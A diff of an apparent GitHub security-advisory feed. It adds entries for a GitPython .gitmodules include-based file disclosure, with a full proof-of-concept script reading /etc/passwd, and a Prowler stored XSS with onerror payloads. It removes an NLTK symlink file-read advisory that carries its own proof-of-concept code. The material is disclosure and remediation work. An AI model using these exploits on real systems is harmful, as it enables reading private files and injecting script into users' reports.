+<li>PoC (<code>gitpython-003-poc.py</code>, embedded below) reproduces this end-to-end against this exact checkout via the public API only (<code>Repo.clone_from</code> + <code>list(repo.submodules)</code>, default arguments, no monkeypatching), against both a throwaway secret file and <code>/etc/passwd</code>.</li>
+</ul>
+<h2 id="false-positive-check-adversarial-re-read">False-positive check (adversarial re-read)</h2>
+<ul>
+<li><strong>Is this the same bug as <code>GHSA-hmq2-w58f-27jc</code>?</strong> No — that advisory is about the <code>.gitmodules</code> submodule <em>name</em> driving <code>_module_abspath</code>/<code>os.makedirs()</code> (creating a git repository/module directory outside the working tree, a write/RCE-adjacent primitive via a completely different function). This finding is about the <code>[include]</code> directive in the <em>same file</em> reaching a config-parser read primitive — a different mechanism, different function, different impact class (content disclosure, not directory creation).</li>
+<li><strong>Is this the same bug as <code>GHSA-cwvm-v4w8-q58c</code> (blind LFI)?</strong> No — that advisory is explicitly documented by its own reporter as content-free/blind (existence-only), and lives in <code>git/refs/symbolic.py</code>'s ref-name resolution feeding <code>Repo.commit</code>/<code>tree</code>/<code>index.diff</code> — an entirely different module and code path. This finding discloses actual file content via <code>git/config.py</code>'s include-directive resolution.</li>
+<li><strong>Is the impact overstated given only one line leaks?</strong> No — this is an accurate scoping caveat already reflected in the severity/impact discussion, not a reachability blocker: attacker has full control over which path is targeted (absolute paths work unconditionally), requires zero interaction beyond the single most common submodule operation, and the PoC demonstrates a real, working end-to-end disclosure through the standard <code>clone_from</code> + <code>list(repo.submodules)</code> workflow.</li>
+<li><strong>Could the exception simply be silently swallowed by GitPython before reaching the caller?</strong> No — confirmed by reading <code>Submodule.iter_items()</code>'s exception handling, which catches only <code>IOError</code>/<code>BadName</code>; <code>configparser.MissingSectionHeaderError</code> propagates uncaught.</li>
+<li>Verdict: no concrete blocker found. <strong>CONFIRMED</strong> — reproduced independently against both a throwaway secret file and <code>/etc/passwd</code>.</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>Pass <code>merge_includes=False</code> when constructing <code>SubmoduleConfigParser</code> in <code>Submodule._config_parser()</code> (<code>git/objects/submodule/base.py</code>), mirroring the existing fix in <code>Repo.config_writer()</code> (commit <code>41ecc6a4</code>) — <code>.gitmodules</code> content is always attacker-controlled and should never be allowed to pull in <code>include</code>/<code>includeIf</code> directives. As defense in depth, <code>GitConfigParser.read()</code>'s include-path resolution should enforce that resolved include paths stay within the repository's own directory tree, and parsing-error messages (<code>MissingSectionHeaderError</code>/<code>ParsingError</code>) should avoid embedding raw file content when parsing a file the caller did not explicitly ask to open.</p>
+<h2 id="confidence">Confidence</h2>
+<p>High. Root cause confirmed by direct code reading across both <code>git/config.py</code> and <code>git/objects/submodule/base.py</code>, cross-checked against the fix commit that hardened the sibling code path but not this one; exploit chain reproduced independently, twice, against the current HEAD (a throwaway secret file and <code>/etc/passwd</code>).</p>
+<h2 id="proof-of-concept-source-gitpython-003-pocpy">Proof-of-Concept source (<code>gitpython-003-poc.py</code>)</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+GITPYTHON-003 PoC: `.gitmodules` -- fully attacker-controlled content shipped
+inside a cloned repository -- can contain `[include] path = &lt;any local path&gt;`.
+`Submodule._config_parser()` builds the parser used for `repo.submodules` (and
+other submodule reads) via `SubmoduleConfigParser(fp_module, read_only=...)`
+without passing `merge_includes=False`, so the class default `merge_includes=True`
+is inherited. GitConfigParser then opens the target file; if it isn't valid
+git-config syntax (true of virtually any non-gitconfig file), Python's
+`configparser.MissingSectionHeaderError` embeds the file's first line verbatim
+in its exception message, which propagates out of the ordinary, read-only
+`repo.submodules` call -- a non-blind local file content disclosure primitive.
+
+Run:
+  PYTHONPATH="&lt;repo&gt;:&lt;repo&gt;/gitdb:&lt;repo&gt;/smmap" python3 gitpython-003-poc.py &lt;workdir&gt; &lt;target-file&gt;
+
+Benign: reads only the given &lt;target-file&gt; (defaults to a throwaway secret file
+created under &lt;workdir&gt; if omitted) and never writes/exfiltrates it anywhere
+except printing it locally to prove the primitive. No destructive action.
+"""
+import os
+import subprocess
+import sys
+
+
+def main():
+    workdir = sys.argv[1] if len(sys.argv) &gt; 1 else "/tmp/gitpython-003-poc"
+    target_file = sys.argv[2] if len(sys.argv) &gt; 2 else os.path.join(workdir, "secret.txt")
+
+    attacker_repo = os.path.join(workdir, "attacker-repo")
+    dest = os.path.join(workdir, "dest")
+    for p in (attacker_repo, dest):
+        os.makedirs(p, exist_ok=True)
+
+    if not os.path.exists(target_file):
+        os.makedirs(os.path.dirname(target_file), exist_ok=True)
+        with open(target_file, "w") as f:
+            f.write("TOP-SECRET-DB-PASSWORD=hunter2-actual-secret-value\n")
+
+    subprocess.run(["git", "init", "-q", "-b", "main", attacker_repo], check=True)
+    subprocess.run(["git", "-C", attacker_repo, "config", "user.email", "a@example.com"], check=True)
+    subprocess.run(["git", "-C", attacker_repo, "config", "user.name", "Attacker"], check=True)
+
+    with open(os.path.join(attacker_repo, "file.txt"), "w") as f:
+        f.write("hello\n")
+
+    with open(os.path.join(attacker_repo, ".gitmodules"), "w") as f:
+        f.write(
+            '[submodule "totally-normal-dep"]\n'
+            "\tpath = vendor/dep\n"
+            "\turl = https://example.com/dep.git\n"
+            "[include]\n"
+            "\tpath = %s\n" % target_file
+        )
+
+    subprocess.run(["git", "-C", attacker_repo, "add", "file.txt", ".gitmodules"], check=True)
+    subprocess.run(["git", "-C", attacker_repo, "commit", "-q", "-m", "init"], check=True)
+
+    import git  # gitpython under test
+    import configparser
+
+    repo = git.Repo.clone_from(attacker_repo, dest)
+
+    try:
+        subs = list(repo.submodules)
+        print("NOT VULNERABLE: no exception raised, submodules =", subs)
+        sys.exit(1)
+    except configparser.MissingSectionHeaderError as e:
+        msg = str(e)
+        print("VULNERABLE: MissingSectionHeaderError leaked file content via repo.submodules:")
+        print(msg)
+        with open(target_file) as f:
+            first_line = f.readline().rstrip("\n")
+        if first_line in msg:
+            print("Confirmed: target file's first line is present verbatim in the exception message.")
+            sys.exit(0)
+        else:
+            print("NOT VULNERABLE: exception message did not contain the expected content")
+            sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7833-fr7j-v32q">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7833-fr7j-v32q</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-78675">https://nvd.nist.gov/vuln/detail/CVE-2026-78675</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/pull/2211">https://github.com/gitpython-developers/GitPython/pull/2211</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/commit/ef7568e3b317ce617eacda39b8b54dcdff8c3b5c">https://github.com/gitpython-developers/GitPython/commit/ef7568e3b317ce617eacda39b8b54dcdff8c3b5c</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.59">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.59</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3785.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3785.yaml</a></li>
+<li><a href="https://www.vulncheck.com/advisories/gitpython-before-local-file-content-disclosure-via-gitmodules">https://www.vulncheck.com/advisories/gitpython-before-local-file-content-disclosure-via-gitmodules</a></li>
+<li><a href="https://github.com/advisories/GHSA-7833-fr7j-v32q">https://github.com/advisories/GHSA-7833-fr7j-v32q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7833-fr7j-v32q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-08T18:38:51.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[gitpython] Duplicate Advisory: Arbitrary local file content disclosure via [include] directive in untrusted .gitmodules (SubmoduleConfigParser never disables merge_includes)]]></title>
+        <id>https://github.com/advisories/GHSA-crmc-f4m7-33fj</id>
+        <link href="https://github.com/advisories/GHSA-crmc-f4m7-33fj"/>
+        <updated>2026-09-08T18:18:43.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-7833-fr7j-v32q. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>GitPython before 3.1.59 fails to disable merge_includes when parsing .gitmodules, allowing attackers to disclose local file content by including arbitrary file paths via [include] directives. Attackers can craft a malicious .gitmodules file with include directives pointing to sensitive files; when repo.submodules is accessed, GitConfigParser raises MissingSectionHeaderError embedding the target file's first line verbatim in the exception message.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7833-fr7j-v32q">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7833-fr7j-v32q</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-78675">https://nvd.nist.gov/vuln/detail/CVE-2026-78675</a></li>
+<li><a href="https://www.vulncheck.com/advisories/gitpython-before-local-file-content-disclosure-via-gitmodules">https://www.vulncheck.com/advisories/gitpython-before-local-file-content-disclosure-via-gitmodules</a></li>
+<li><a href="https://github.com/advisories/GHSA-crmc-f4m7-33fj">https://github.com/advisories/GHSA-crmc-f4m7-33fj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-crmc-f4m7-33fj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-25T03:32:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[prowler-cloud] Prowler: Stored XSS in HTML reports through unescaped cloud resource tags]]></title>
+        <id>https://github.com/advisories/GHSA-c2jg-2778-ggm4</id>
+        <link href="https://github.com/advisories/GHSA-c2jg-2778-ggm4"/>
+        <updated>2026-09-08T18:09:26.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Prowler's HTML output formatter inserts <code>finding.resource_tags</code> into the generated report without HTML escaping. A cloud principal who can create or edit a resource tag in an account that is later scanned can store HTML or JavaScript in that tag. When another user opens the generated Prowler HTML report, the payload executes in the report page.</p>
+<h2 id="impact">Impact</h2>
+<p>This is stored cross-site scripting in a security report artifact. The attacker needs permission to influence tags on a scanned cloud resource, and the victim must open the generated HTML report. In that context, JavaScript can read and modify the report DOM, alter displayed findings, and interact with any same-origin local or hosted report content available to the browser. This can undermine trust in generated security findings and can expose data contained in the report page.</p>
+<h2 id="gate-checks">Gate checks</h2>
+<p>The repository has 13,875 GitHub stars, which is above the 10,000 star floor. <code>SECURITY.md</code> is present and does not reject GitHub private reporting. The dedicated GitHub private vulnerability reporting endpoint for <code>prowler-cloud/prowler</code> returned <code>true</code>.</p>
+<h2 id="affected-versions">Affected versions</h2>
+<p>The vulnerable sink is present in current <code>master</code> at commit <code>329dfdf8e6cb8bc0424fb54b6595408e20969782</code> and in the latest GitHub release tag <code>5.28.0</code>. The package metadata identifies the Python package as <code>prowler</code>.</p>
+<h2 id="technical-details">Technical details</h2>
+<p>The HTML formatter builds each finding row with an f-string in <code>prowler/lib/outputs/html/html.py</code>. Neighboring fields are explicitly escaped:</p>
+<ul>
+<li><code>resource_uid</code> is escaped at line 85 with <code>.replace("&lt;", "&amp;lt;").replace("&gt;", "&amp;gt;")</code>.</li>
+<li><code>status_extended</code> is escaped at line 87 with the same pattern.</li>
+</ul>
+<p>The tag column does not apply equivalent escaping:</p>
+<pre><code class="language-python">&lt;td&gt;{parse_html_string(unroll_dict(finding.resource_tags))}&lt;/td&gt;
+</code></pre>
+<p><code>unroll_dict</code> concatenates tag keys and values into a string, and <code>parse_html_string</code> only prefixes each item with an HTML bullet. Neither function escapes <code>&lt;</code>, <code>&gt;</code>, quotes, or event-handler attributes before insertion into the table cell. As a result, a tag value such as this remains active markup in the generated report:</p>
+<pre><code class="language-html">&lt;img src=x onerror="window.PROWLER_TAG_XSS=1"&gt;
+</code></pre>
+<h2 id="reproduction">Reproduction</h2>
+<ol>
+<li>Create or identify a cloud resource that Prowler will include in an HTML report.</li>
+<li>Add a tag value containing a harmless proof payload, for example:</li>
+</ol>
+<pre><code class="language-html">&lt;img src=x onerror="window.PROWLER_TAG_XSS=1"&gt;
+</code></pre>
+<ol start="3">
+<li>Run Prowler against the account and generate HTML output.</li>
+<li>Open the generated HTML report in a browser.</li>
+<li>The payload executes from the tags column.</li>
+</ol>
+<p>A proof HTML fragment using the same formatter structure set <code>window.PROWLER_TAG_XSS=1</code> from <code>resource_tags</code>, while equivalent payloads in <code>resource_uid</code> and <code>status_extended</code> stayed text because those fields are escaped.</p>
+<p>Local evidence:</p>
+<ul>
+<li><code>/home/unkn0wn/security_audit/vulnerability-reports/prowler-html-tag-xss-evidence-2026-05-26.json</code></li>
+<li><code>/home/unkn0wn/security_audit/vulnerability-reports/prowler-html-tag-xss-proof-full.html</code></li>
+</ul>
+<h2 id="poc">PoC</h2>
+<p>The minimized generated row below mirrors the vulnerable formatter output. The first and third candidate payloads are escaped controls. The middle payload is the unescaped <code>resource_tags</code> value and executes when the report is rendered.</p>
+<pre><code class="language-html">&lt;tr class="table-danger"&gt;
+  &lt;td&gt;&amp;lt;img src=x onerror="window.PROWLER_UID_XSS=1"&amp;gt;&lt;/td&gt;
+  &lt;td&gt;
+    &amp;#x2022;Owner=&lt;img src=x onerror="window.PROWLER_TAG_XSS=1;document.body.setAttribute('data-prowler-tag-xss','1')"&gt;
+  &lt;/td&gt;
+  &lt;td&gt;&amp;lt;img src=x onerror="window.PROWLER_STATUS_XSS=1"&amp;gt;&lt;/td&gt;
+&lt;/tr&gt;
+</code></pre>
+<p>Browser proof result from the local artifact:</p>
+<pre><code class="language-json">{"tag": 1, "uid": 0, "status": 0, "attr": "1"}
+</code></pre>
+<h2 id="remediation">Remediation</h2>
+<p>Escape tag keys and values before inserting them into HTML output. Prefer a single HTML escaping helper for every finding field that can originate from provider data. If bullets or separators are needed, build the list structure after escaping each key and value, rather than escaping the final HTML string after markup has been added.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/prowler-cloud/prowler/security/advisories/GHSA-c2jg-2778-ggm4">https://github.com/prowler-cloud/prowler/security/advisories/GHSA-c2jg-2778-ggm4</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73262">https://nvd.nist.gov/vuln/detail/CVE-2026-73262</a></li>
+<li><a href="https://github.com/prowler-cloud/prowler/pull/12221">https://github.com/prowler-cloud/prowler/pull/12221</a></li>
+<li><a href="https://github.com/prowler-cloud/prowler/commit/6db407ed3c17d4c73a8f619fdb30580c8465027f">https://github.com/prowler-cloud/prowler/commit/6db407ed3c17d4c73a8f619fdb30580c8465027f</a></li>
+<li><a href="https://github.com/prowler-cloud/prowler/releases/tag/5.37.0">https://github.com/prowler-cloud/prowler/releases/tag/5.37.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-c2jg-2778-ggm4">https://github.com/advisories/GHSA-c2jg-2778-ggm4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c2jg-2778-ggm4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-08T18:09:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[prowler] Prowler: Stored XSS in HTML reports through unescaped cloud resource tags]]></title>
+        <id>https://github.com/advisories/GHSA-c2jg-2778-ggm4</id>
+        <link href="https://github.com/advisories/GHSA-c2jg-2778-ggm4"/>
+        <updated>2026-09-08T18:09:26.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Prowler's HTML output formatter inserts <code>finding.resource_tags</code> into the generated report without HTML escaping. A cloud principal who can create or edit a resource tag in an account that is later scanned can store HTML or JavaScript in that tag. When another user opens the generated Prowler HTML report, the payload executes in the report page.</p>
+<h2 id="impact">Impact</h2>
+<p>This is stored cross-site scripting in a security report artifact. The attacker needs permission to influence tags on a scanned cloud resource, and the victim must open the generated HTML report. In that context, JavaScript can read and modify the report DOM, alter displayed findings, and interact with any same-origin local or hosted report content available to the browser. This can undermine trust in generated security findings and can expose data contained in the report page.</p>
+<h2 id="gate-checks">Gate checks</h2>
+<p>The repository has 13,875 GitHub stars, which is above the 10,000 star floor. <code>SECURITY.md</code> is present and does not reject GitHub private reporting. The dedicated GitHub private vulnerability reporting endpoint for <code>prowler-cloud/prowler</code> returned <code>true</code>.</p>
+<h2 id="affected-versions">Affected versions</h2>
+<p>The vulnerable sink is present in current <code>master</code> at commit <code>329dfdf8e6cb8bc0424fb54b6595408e20969782</code> and in the latest GitHub release tag <code>5.28.0</code>. The package metadata identifies the Python package as <code>prowler</code>.</p>
+<h2 id="technical-details">Technical details</h2>
+<p>The HTML formatter builds each finding row with an f-string in <code>prowler/lib/outputs/html/html.py</code>. Neighboring fields are explicitly escaped:</p>
+<ul>
+<li><code>resource_uid</code> is escaped at line 85 with <code>.replace("&lt;", "&amp;lt;").replace("&gt;", "&amp;gt;")</code>.</li>
+<li><code>status_extended</code> is escaped at line 87 with the same pattern.</li>
+</ul>
+<p>The tag column does not apply equivalent escaping:</p>
+<pre><code class="language-python">&lt;td&gt;{parse_html_string(unroll_dict(finding.resource_tags))}&lt;/td&gt;
+</code></pre>
+<p><code>unroll_dict</code> concatenates tag keys and values into a string, and <code>parse_html_string</code> only prefixes each item with an HTML bullet. Neither function escapes <code>&lt;</code>, <code>&gt;</code>, quotes, or event-handler attributes before insertion into the table cell. As a result, a tag value such as this remains active markup in the generated report:</p>
+<pre><code class="language-html">&lt;img src=x onerror="window.PROWLER_TAG_XSS=1"&gt;
+</code></pre>
+<h2 id="reproduction">Reproduction</h2>
+<ol>
+<li>Create or identify a cloud resource that Prowler will include in an HTML report.</li>
+<li>Add a tag value containing a harmless proof payload, for example:</li>
+</ol>
+<pre><code class="language-html">&lt;img src=x onerror="window.PROWLER_TAG_XSS=1"&gt;
+</code></pre>
+<ol start="3">
+<li>Run Prowler against the account and generate HTML output.</li>
+<li>Open the generated HTML report in a browser.</li>
+<li>The payload executes from the tags column.</li>
+</ol>
+<p>A proof HTML fragment using the same formatter structure set <code>window.PROWLER_TAG_XSS=1</code> from <code>resource_tags</code>, while equivalent payloads in <code>resource_uid</code> and <code>status_extended</code> stayed text because those fields are escaped.</p>
+<p>Local evidence:</p>
+<ul>
+<li><code>/home/unkn0wn/security_audit/vulnerability-reports/prowler-html-tag-xss-evidence-2026-05-26.json</code></li>
+<li><code>/home/unkn0wn/security_audit/vulnerability-reports/prowler-html-tag-xss-proof-full.html</code></li>
+</ul>
+<h2 id="poc">PoC</h2>
+<p>The minimized generated row below mirrors the vulnerable formatter output. The first and third candidate payloads are escaped controls. The middle payload is the unescaped <code>resource_tags</code> value and executes when the report is rendered.</p>
+<pre><code class="language-html">&lt;tr class="table-danger"&gt;
+  &lt;td&gt;&amp;lt;img src=x onerror="window.PROWLER_UID_XSS=1"&amp;gt;&lt;/td&gt;
+  &lt;td&gt;
+    &amp;#x2022;Owner=&lt;img src=x onerror="window.PROWLER_TAG_XSS=1;document.body.setAttribute('data-prowler-tag-xss','1')"&gt;
+  &lt;/td&gt;
+  &lt;td&gt;&amp;lt;img src=x onerror="window.PROWLER_STATUS_XSS=1"&amp;gt;&lt;/td&gt;
+&lt;/tr&gt;
+</code></pre>
+<p>Browser proof result from the local artifact:</p>
+<pre><code class="language-json">{"tag": 1, "uid": 0, "status": 0, "attr": "1"}
+</code></pre>
+<h2 id="remediation">Remediation</h2>
+<p>Escape tag keys and values before inserting them into HTML output. Prefer a single HTML escaping helper for every finding field that can originate from provider data. If bullets or separators are needed, build the list structure after escaping each key and value, rather than escaping the final HTML string after markup has been added.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/prowler-cloud/prowler/security/advisories/GHSA-c2jg-2778-ggm4">https://github.com/prowler-cloud/prowler/security/advisories/GHSA-c2jg-2778-ggm4</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73262">https://nvd.nist.gov/vuln/detail/CVE-2026-73262</a></li>
+<li><a href="https://github.com/prowler-cloud/prowler/pull/12221">https://github.com/prowler-cloud/prowler/pull/12221</a></li>
+<li><a href="https://github.com/prowler-cloud/prowler/commit/6db407ed3c17d4c73a8f619fdb30580c8465027f">https://github.com/prowler-cloud/prowler/commit/6db407ed3c17d4c73a8f619fdb30580c8465027f</a></li>
+<li><a href="https://github.com/prowler-cloud/prowler/releases/tag/5.37.0">https://github.com/prowler-cloud/prowler/releases/tag/5.37.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-c2jg-2778-ggm4">https://github.com/advisories/GHSA-c2jg-2778-ggm4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c2jg-2778-ggm4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-08T18:09:25.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[gitpython] Duplicate Advisory: GitPython: Command Injection via git long-option prefix abbreviation bypass of CVE-2026-42215 blocklist]]></title>
         <id>https://github.com/advisories/GHSA-6r2r-ww24-7h52</id>
@@ -790,913 +1720,5 @@ parser.parse([], '/tmp/malicious_model.pkl')   # loads and unpickles unsafely
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-09-08T16:41:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: Symlink-based arbitrary file read in IPIPANCorpusReader, bypasses nltk.pathsec entirely]]></title>
-        <id>https://github.com/advisories/GHSA-3hhw-38pf-pxj6</id>
-        <link href="https://github.com/advisories/GHSA-3hhw-38pf-pxj6"/>
-        <updated>2026-09-08T16:40:39.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>IPIPANCorpusReader</code> (<code>nltk/corpus/reader/ipipan.py</code>) exposes public methods, <code>channels()</code>, <code>domains()</code>, <code>categories()</code>, and <code>fileids(channels=...)</code>, that accept a caller supplied <code>fileids</code> list and read a file via a completely unprotected builtin <code>open()</code> call, with no <code>nltk.pathsec</code> involvement at all. A symlink placed inside the corpus root, with a name containing no separators or <code>..</code>, passes NLTK's existing traversal checks and is opened directly, reading a file from anywhere on the filesystem the process can access.</p>
-<h2 id="root-cause">Root cause</h2>
-<p>All four methods route through <code>_get_tag()</code>:</p>
-<pre><code class="language-python">def _get_tag(self, f, tag):
-    tags = []
-    with open(f) as infile:   # builtin open(), no pathsec involvement
-        header = infile.read()
-    ...
-</code></pre>
-<p><code>f</code> arrives via <code>_list_header_files()</code> / <code>_list_morph_files_by()</code>, both of which call:</p>
-<pre><code class="language-python">f.replace("morph.xml", "header.xml")
-</code></pre>
-<p>on the result of <code>self.abspath(...)</code> or <code>self.abspaths(...)</code>. <code>FileSystemPathPointer</code> subclasses <code>str</code>, so <code>.replace()</code> returns a plain Python string, silently discarding the <code>PathPointer</code> wrapper. That plain string is handed straight to builtin <code>open()</code>.</p>
-<p>This is a more severe variant of the same CWE-59 class already fixed elsewhere in this codebase (<code>CorpusReader.open()</code>, <code>NKJPCorpusReader.add_root()</code>, and the recent <code>FramenetCorpusReader</code> fix): those route file access through <code>nltk.pathsec.validate_path()</code>, at minimum the global, non-scoped check, before opening. Here, converting the <code>PathPointer</code> to a plain string before calling <code>open()</code> skips <code>pathsec</code> completely, not just the corpus-root-scoped check, so the symlink target does not even need to land under a registered <code>nltk.data.path</code> root.</p>
-<p>Plain literal <code>../</code> traversal in the fileid is still blocked by <code>FileSystemPathPointer.join()</code>, so this is specifically the symlink variant, not a regression of the older, simpler traversal class.</p>
-<h2 id="proof-of-concept">Proof of concept</h2>
-<p>Constructed the normal, documented way, <code>fileids</code> as a regex over file paths, so the reader auto-discovers whatever <code>.xml</code> files exist in its root with no special knowledge of the planted symlink.</p>
-<pre><code class="language-python">import os
-import tempfile
-
-from nltk.corpus.reader.ipipan import IPIPANCorpusReader
-
-root = tempfile.mkdtemp()
-corpus_root = os.path.join(root, "ipipan")
-os.makedirs(corpus_root)
-
-with open(os.path.join(corpus_root, "real_morph.xml"), "w") as f:
-    f.write("&lt;channel&gt;legit&lt;/channel&gt;")
-
-secret_dir = os.path.join(root, "outside_ipipan_root")
-os.makedirs(secret_dir)
-secret_path = os.path.join(secret_dir, "stolen.xml")
-with open(secret_path, "w") as f:
-    f.write("&lt;channel&gt;TOP-SECRET-CHANNEL-DATA-FROM-OUTSIDE-CORPUS-ROOT&lt;/channel&gt;")
-
-os.symlink(secret_path, os.path.join(corpus_root, "evil_link.xml"))
-
-reader = IPIPANCorpusReader(corpus_root, r".*\.xml")
-print("Auto-discovered fileids:", sorted(reader.fileids()))
-
-result = reader.channels(fileids=["evil_link.xml"])
-print(result)
-</code></pre>
-<p>Actual output when run against current <code>develop</code>:</p>
-<pre><code>Auto-discovered fileids: ['evil_link.xml', 'real_morph.xml']
-['TOP-SECRET-CHANNEL-DATA-FROM-OUTSIDE-CORPUS-ROOT']
-</code></pre>
-<p>That content was read from <code>secret_path</code>, a file entirely outside <code>corpus_root</code>. No exception raised anywhere. The planted symlink even surfaces naturally in the reader's own <code>fileids()</code> listing, exactly as a real file would.</p>
-<p>Verified separately that literal <code>../</code> traversal in the fileid is still rejected (<code>ValueError: Traversal blocked</code>), confirming this is specifically the symlink gap, not a broader regression.</p>
-<h2 id="why-this-is-in-scope">Why this is in scope</h2>
-<ul>
-<li>No malicious file for a victim to open, no special user interaction. Just a tampered or shared corpus directory (<code>SECURITY.md</code> names "shared environments... multi-tenant pipelines" as the project's own stated threat model) plus a completely normal API call.</li>
-<li>Core corpus-reader code, reached through plain <code>import nltk</code> and documented, programmatic usage (<code>words()</code>, <code>sents()</code>, <code>channels()</code>, etc.), not a demo or GUI tool.</li>
-<li>Same reader category, and same CWE-59 mechanism, already treated as CVE-worthy twice in this codebase for <code>FramenetCorpusReader</code> and <code>NKJPCorpusReader</code>.</li>
-<li>Not a bypass of a claimed fix. <code>ipipan.py</code> has never had security hardening applied, and has no dedicated test coverage at all.</li>
-</ul>
-<h2 id="cvss-v31">CVSS v3.1</h2>
-<ul>
-<li><strong>AV:L, AC:L</strong>: exploitation is local filesystem symlink placement, then immediate and deterministic once triggered.</li>
-<li><strong>PR:L</strong>: the attacker needs some pre-existing ability to plant a symlink somewhere reachable, not zero privilege, but not elevated either.</li>
-<li><strong>UI:N</strong>: fires during routine, automated corpus processing, no separate victim action.</li>
-<li><strong>S:U</strong>: stays within the same process's existing privileges.</li>
-<li><strong>C:H, I:N, A:N</strong>: arbitrary file read only, no write, no crash.</li>
-</ul>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Route <code>_get_tag()</code> through <code>nltk.pathsec.validate_path()</code> with the corpus root as <code>required_root</code>, or through <code>CorpusReader.open()</code>, instead of converting the <code>PathPointer</code> to a plain string and calling builtin <code>open()</code> directly. The same fix pattern already applied to <code>FramenetCorpusReader</code> and <code>NKJPCorpusReader</code> applies directly here.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-3hhw-38pf-pxj6">https://github.com/nltk/nltk/security/advisories/GHSA-3hhw-38pf-pxj6</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62383">https://nvd.nist.gov/vuln/detail/CVE-2026-62383</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3727">https://github.com/nltk/nltk/pull/3727</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/ee1a42e51982c4dce6ad3ee77ff1ac43894288ab">https://github.com/nltk/nltk/commit/ee1a42e51982c4dce6ad3ee77ff1ac43894288ab</a></li>
-<li><a href="https://github.com/nltk/nltk/releases/tag/v3.10.2">https://github.com/nltk/nltk/releases/tag/v3.10.2</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3726.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3726.yaml</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-ipipancorpusreader-symlink-arbitrary-file-read">https://www.vulncheck.com/advisories/nltk-ipipancorpusreader-symlink-arbitrary-file-read</a></li>
-<li><a href="https://github.com/advisories/GHSA-3hhw-38pf-pxj6">https://github.com/advisories/GHSA-3hhw-38pf-pxj6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3hhw-38pf-pxj6</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-08T16:40:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: Symlink-based sandbox bypass in FramenetCorpusReader (bypasses the fix for CVE-2026-54292)]]></title>
-        <id>https://github.com/advisories/GHSA-f833-7jw8-xwrv</id>
-        <link href="https://github.com/advisories/GHSA-f833-7jw8-xwrv"/>
-        <updated>2026-09-08T16:39:28.000Z</updated>
-        <content type="html"><![CDATA[<p>This is a <strong>new, distinct vulnerability</strong>: a bypass of the fix already published as <a href="https://github.com/nltk/nltk/security/advisories/GHSA-xh95-f55m-82fw">GHSA-xh95-f55m-82fw</a> ("Path traversal in NLTK FramenetCorpusReader.frame() allows arbitrary XML file read, bypassing the nltk.pathsec sandbox"), not a duplicate of it.</p>
